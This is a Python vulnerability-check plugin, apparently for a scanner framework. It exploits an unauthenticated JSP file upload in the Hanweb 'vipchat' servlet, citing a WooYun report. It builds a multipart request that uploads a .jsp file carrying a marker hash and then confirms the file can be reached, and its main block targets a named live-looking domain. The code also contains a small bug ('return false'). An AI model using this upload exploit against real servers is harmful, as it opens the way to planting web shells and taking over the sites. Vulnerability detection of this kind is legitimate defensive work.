#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0143430

import re

def assign(service, arg): 
    if service == "hanweb":
        return True, arg
		
def audit(arg):
    getdata1 = 'vipchat/VerifyCodeServlet?var=clusterid'
    code, head, res, errcode, _ = curl.curl2(arg+getdata1)
    m1 = re.search('JSESSIONID=(.*?);',head)
    if code!= 200:
        return false
    raw = """
POST /vipchat/servlet/upfile.do HTTP/1.1
Host: www.notedyy.com
Proxy-Connection: keep-alive
Content-Length: 404
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUfIZSnIoUZx9mHpA
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID="""+m1.group(1)+"""

------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="isdefault"

true
------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="allowtype"

jsp
------WebKitFormBoundaryUfIZSnIoUZx9mHpA
Content-Disposition: form-data; name="picfile"; filename="1.jsp"
Content-Type: application/octet-stream

just test c4ca4238a0b923820dcc509a6f75849b
------WebKitFormBoundaryUfIZSnIoUZx9mHpA--

"""
    getdata2 = 'vipchat/servlet/upfile.do'
    url = arg + getdata2
    code, head, res, errcode, _ = curl.curl2(url,raw=raw)
    m = re.search('/vipchat/home/info/(.*?).jsp',res)
    if m :
        url = arg+ m.group(0)
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:    
            security_hole(arg+getdata2+'   :file upload Vulnerable:')
            
        
        
           
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hanweb', 'http://www.notedyy.com/')[1])